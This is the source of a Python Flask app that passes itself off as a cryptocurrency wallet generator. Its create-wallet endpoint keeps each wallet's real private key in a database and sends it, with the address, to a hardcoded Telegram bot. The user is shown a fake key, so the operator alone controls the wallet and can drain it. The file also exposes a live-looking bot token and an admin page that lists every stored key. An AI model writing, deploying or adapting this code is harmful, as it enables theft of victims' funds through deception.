from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import sqlite3
import secrets
from datetime import datetime
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

TOKEN = "7656552098:AAGJSer06cf6Wc28IjcxD_spBHs2btszcIg"

conn = sqlite3.connect('saqr.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS wallets
    (id INTEGER PRIMARY KEY AUTOINCREMENT,
     network TEXT, address TEXT UNIQUE,
     real_key TEXT, fake_key TEXT,
     status TEXT DEFAULT 'active',
     created_at TEXT)''')
conn.commit()

def send_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get('result'):
            for u in data['result']:
                if 'message' in u:
                    chat_id = u['message']['chat']['id']
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=5)
                    return
    except:
        pass

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/select')
def select():
    return render_template('select.html')

@app.route('/wallet')
def wallet():
    return render_template('wallet.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/withdraw')
def withdraw():
    return render_template('withdraw.html')

@app.route('/api/create-wallet', methods=['POST'])
def create_wallet():
    network = request.json.get('network', 'ethereum')
    
    if network == 'solana':
        address = "sol_" + secrets.token_hex(20)
        real_key = "sol_key_" + secrets.token_hex(32)
    else:
        address = "0x" + secrets.token_hex(20)
        real_key = "0x" + secrets.token_hex(32)
    
    fake_key = "0x" + secrets.token_hex(32)
    
    c.execute("INSERT INTO wallets (network, address, real_key, fake_key, created_at) VALUES (?, ?, ?, ?, ?)",
              (network, address, real_key, fake_key, datetime.now().isoformat()))
    conn.commit()
    
    emoji = {"solana": "⚡", "ethereum": "💎", "bsc": "🔷"}.get(network, "💰")
    send_telegram(f"🦅 محفظة جديدة!\n{emoji} {network}\n🏦 {address}\n🔑 {real_key}")
    
    return jsonify({'address': address, 'private_key': fake_key})

@app.route('/admin')
def admin():
    token = request.args.get('token', '')
    if token != 'saqr2026':
        return "Unauthorized", 401
    c.execute("SELECT * FROM wallets ORDER BY id DESC")
    wallets = c.fetchall()
    return render_template('admin.html', wallets=wallets)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
